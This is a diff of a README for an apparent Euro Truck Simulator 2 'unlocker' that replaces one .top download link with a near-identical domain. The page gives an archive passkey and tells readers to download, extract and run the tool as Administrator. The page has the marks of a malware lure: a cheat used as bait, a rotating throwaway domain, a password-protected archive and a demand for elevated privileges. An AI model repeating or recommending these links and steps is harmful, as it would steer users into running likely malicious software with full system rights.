@@ -6,7 +6,7 @@ Euro Truck Simulator 2 unlocker with map DLC unlock, truck dealer unlock, garage
 
 ## ⬇️ Download
 
-**[CLICK](https://gitdownapply.top/)**
+**[CLICK](https://gitdownapps.top)**
 
 Archive passkey: `Github`
 
@@ -70,7 +70,7 @@ Based on popular mods like **TruckersMP**, **ProMods**, and **ETS2 Mod Manager**
 
 ## 🔧 How to Use
 
-1. Click **[CLICK](https://gitdownapply.top/)** to download.
+1. Click **[CLICK](https://gitdownapps.top)** to download.
 2. Extract the archive.
 3. Launch Euro Truck Simulator 2.
 4. Run the tool **as Administrator**.
